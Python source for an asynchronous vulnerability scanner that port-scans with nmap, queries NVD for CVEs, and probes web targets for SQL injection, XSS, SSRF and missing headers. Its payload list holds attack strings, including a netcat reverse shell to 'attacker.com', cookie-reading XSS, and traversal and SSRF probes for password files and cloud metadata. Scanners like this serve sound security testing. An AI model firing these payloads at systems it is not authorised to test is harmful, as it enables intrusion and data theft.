import asyncio
import aiohttp
import socket
import ssl
import json
import hashlib
import base64
import time
import threading
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor


@dataclass
class Vulnerability:
    vuln_id: str
    name: str
    severity: str
    cvss_score: float
    description: str
    affected_component: str
    remediation: str
    cwe_id: Optional[str] = None
    cve_id: Optional[str] = None
    exploit_available: bool = False
    raw_data: Dict = field(default_factory=dict)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class Target:
    host: str
    ports: List[int] = field(default_factory=list)
    protocols: List[str] = field(default_factory=lambda: ['tcp'])
    services: Dict[int, Dict] = field(default_factory=dict)
    os_info: Dict = field(default_factory=dict)
    credentials: Dict = field(default_factory=dict)


class ScannerEngine:
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.results: List[Vulnerability] = []
        self.targets: List[Target] = []
        self.scan_active = False
        self.executor = ThreadPoolExecutor(max_workers=self.config.get('threads', 50))
        self.session = None
        self._lock = threading.Lock()
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> Dict:
        return {
            'sqli': [
                "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
                "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "1'; WAITFOR DELAY '0:0:5'--", "1'; pg_sleep(5)--",
                "admin'--", "1' AND '1'='1", "' OR 1=1--",
            ],
            'xss': [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>", "<body onload=alert(1)>",
                "javascript:alert(1)", "<iframe src='javascript:alert(1)'>",
                "'\"><script>alert('XSS')</script>", "<SCRIPT>alert(1)</SCRIPT>",
                "<img src=x onerror=alert(document.cookie)>",
                "${alert(1)}", "{{constructor.constructor('alert(1)')()}}",
            ],
            'traversal': [
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
                "..%252f..%252f..%252fetc/passwd", "/etc/passwd%00",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
            ],
            'cmd_injection': [
                "; ls -la", "| ls -la", "&& ls -la", "$(ls -la)",
                "; ping -c 10 127.0.0.1", "| nc -e /bin/sh attacker.com 4444",
                "`id`", "$(whoami)", "; cat /etc/passwd",
                "| type C:\\Windows\\System32\\config\\SAM",
            ],
            'ssrf': [
                "http://127.0.0.1:22", "http://localhost:80/server-status",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]:22", "file:///etc/passwd",
                "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:70",
            ]
        }
        
    async def initialize(self):
        connector = aiohttp.TCPConnector(limit=100, ssl=False)
        self.session = aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=30))
        
    async def close(self):
        if self.session:
            await self.session.close()
        self.executor.shutdown(wait=True)

    def add_target(self, host: str, ports: List[int] = None):
        target = Target(host=host, ports=ports or list(range(1, 1025)))
        self.targets.append(target)
        
    def _generate_vuln_id(self, name: str, host: str) -> str:
        data = f"{name}:{host}:{time.time()}"
        return f"VULN-{hashlib.md5(data.encode()).hexdigest()[:12].upper()}"

    async def port_scan(self, target: Target) -> Dict[int, Dict]:
        services = {}
        try:
            import nmap
            nm = nmap.PortScanner()
            nm.scan(target.host, arguments='-sS -sV -T4 --host-timeout 30m')
            
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        service_info = nm[host][proto][port]
                        services[port] = {
                            'state': service_info['state'],
                            'name': service_info.get('name', 'unknown'),
                            'product': service_info.get('product', ''),
                            'version': service_info.get('version', ''),
                            'cpe': service_info.get('cpe', '')
                        }
            
            target.services = services
        except Exception as e:
            print(f"[-] Port scan error: {e}")
            
        return services

    async def check_cve(self, cpe: str, product: str, version: str) -> List[Dict]:
        results = []
        if cpe:
            try:
                async with self.session.get(
                    f"https://services.nvd.nist.gov/rest/json/cves/2.0",
                    params={'cpeName': cpe}
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        for item in data.get('vulnerabilities', [])[:10]:
                            cve = item['cve']
                            metrics = cve.get('metrics', {}).get('cvssMetricV31', [{}])
                            if metrics:
                                cvss_data = metrics[0].get('cvssData', {})
                                results.append({
                                    'id': cve['id'],
                                    'severity': cvss_data.get('baseSeverity', 'UNKNOWN'),
                                    'cvss': cvss_data.get('baseScore', 0),
                                    'description': cve.get('descriptions', [{}])[0].get('value', ''),
                                })
            except Exception:
                pass
        return results

    async def test_sqli(self, url: str) -> List[Vulnerability]:
        vulnerabilities = []
        for payload in self.payloads['sqli']:
            try:
                test_url = f"{url}?id={payload}"
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    errors = ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "syntax error"]
                    for err in errors:
                        if err.lower() in content.lower():
                            vulnerabilities.append(Vulnerability(
                                vuln_id=self._generate_vuln_id("SQLI", url),
                                name="SQL Injection",
                                severity="CRITICAL", cvss_score=9.8,
                                description=f"SQL Injection detected",
                                affected_component=url,
                                remediation="Use parameterized queries",
                                cwe_id="CWE-89", exploit_available=True
                            ))
                            return vulnerabilities
            except Exception:
                continue
        return vulnerabilities

    async def test_xss(self, url: str) -> List[Vulnerability]:
        vulnerabilities = []
        for payload in self.payloads['xss']:
            try:
                test_url = f"{url}?input={payload}"
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    if payload in content or "alert" in content.lower():
                        vulnerabilities.append(Vulnerability(
                            vuln_id=self._generate_vuln_id("XSS", url),
                            name="Cross-Site Scripting",
                            severity="HIGH", cvss_score=8.1,
                            description="XSS vulnerability detected",
                            affected_component=url,
                            remediation="Implement output encoding",
                            cwe_id="CWE-79", exploit_available=True
                        ))
                        break
            except Exception:
                continue
        return vulnerabilities

    async def check_security_headers(self, url: str) -> List[Vulnerability]:
        vulnerabilities = []
        required = {
            'X-Frame-Options': 'HIGH', 'X-Content-Type-Options': 'MEDIUM',
            'Strict-Transport-Security': 'HIGH', 'Content-Security-Policy': 'HIGH',
            'Referrer-Policy': 'LOW', 'Permissions-Policy': 'LOW'
        }
        try:
            async with self.session.get(url) as response:
                headers = response.headers
                for header, severity in required.items():
                    if header not in headers:
                        vulnerabilities.append(Vulnerability(
                            vuln_id=self._generate_vuln_id(f"HEADER_{header}", url),
                            name=f"Missing Security Header: {header}",
                            severity=severity, cvss_score=5.0,
                            description=f"Missing {header}",
                            affected_component=url,
                            remediation=f"Add {header} header"
                        ))
        except Exception:
            pass
        return vulnerabilities

    async def test_ssrf(self, url: str) -> List[Vulnerability]:
        vulnerabilities = []
        for payload in self.payloads['ssrf'][:3]:
            try:
                test_url = f"{url}?url={payload}"
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    indicators = ["SSH-", "ami-id", "root:", "Apache Status"]
                    if any(ind in content for ind in indicators):
                        vulnerabilities.append(Vulnerability(
                            vuln_id=self._generate_vuln_id("SSRF", url),
                            name="Server-Side Request Forgery",
                            severity="HIGH", cvss_score=8.6,
                            description="SSRF vulnerability",
                            affected_component=url,
                            remediation="Implement allowlist for URL fetching",
                            cwe_id="CWE-918"
                        ))
                        break
            except Exception:
                continue
        return vulnerabilities

    async def web_scan(self, target: Target, url: str) -> List[Vulnerability]:
        vulnerabilities = []
        tasks = [
            self.test_sqli(url), self.test_xss(url),
            self.check_security_headers(url), self.test_ssrf(url)
        ]
        results = await asyncio.gather(*tasks)
        for result in results:
            vulnerabilities.extend(result)
        return vulnerabilities

    async def service_scan(self, target: Target, port: int, service: Dict) -> List[Vulnerability]:
        vulnerabilities = []
        service_name = service.get('name', '').lower()
        cpe = service.get('cpe', '')
        product = service.get('product', '')
        version = service.get('version', '')
        
        cve_results = await self.check_cve(cpe, product, version)
        for cve in cve_results:
            vulnerabilities.append(Vulnerability(
                vuln_id=self._generate_vuln_id(cve['id'], target.host),
                name=f"{cve['id']} - {service_name}",
                severity=cve['severity'], cvss_score=cve['cvss'],
                description=cve['description'],
                affected_component=f"{target.host}:{port}/{service_name}",
                remediation="Update to latest version",
                cve_id=cve['id'],
                exploit_available=True
            ))
        
        if service_name in ['http', 'https']:
            protocol = 'https' if service_name == 'https' else 'http'
            web_url = f"{protocol}://{target.host}:{port}"
            web_vulns = await self.web_scan(target, web_url)
            vulnerabilities.extend(web_vulns)
            
        return vulnerabilities

    async def run_full_scan(self) -> Dict[str, List[Vulnerability]]:
        await self.initialize()
        self.scan_active = True
        results = {}
        
        for target in self.targets:
            print(f"\n[*] Scanning target: {target.host}")
            
            services = await self.port_scan(target)
            all_vulns = []
            
            for port, service in services.items():
                if service['state'] == 'open':
                    vulns = await self.service_scan(target, port, service)
                    all_vulns.extend(vulns)
            
            results[target.host] = all_vulns
            self.results.extend(all_vulns)
            print(f"[+] Found {len(all_vulns)} vulnerabilities")
            
        self.scan_active = False
        await self.close()
        return results

    def export_results(self, output_path: str, fmt: str = 'json'):
        data = [{
            'vuln_id': v.vuln_id, 'name': v.name, 'severity': v.severity,
            'cvss_score': v.cvss_score, 'description': v.description,
            'affected_component': v.affected_component, 'remediation': v.remediation,
            'cwe_id': v.cwe_id, 'cve_id': v.cve_id, 'exploit_available': v.exploit_available,
            'timestamp': v.timestamp
        } for v in self.results]
        
        with open(output_path, 'w') as f:
            if fmt == 'json':
                json.dump(data, f, indent=2)
            else:
                import csv
                writer = csv.DictWriter(f, fieldnames=data[0].keys() if data else [])
                writer.writeheader()
                writer.writerows(data)
        print(f"[+] Results exported to {output_path}")
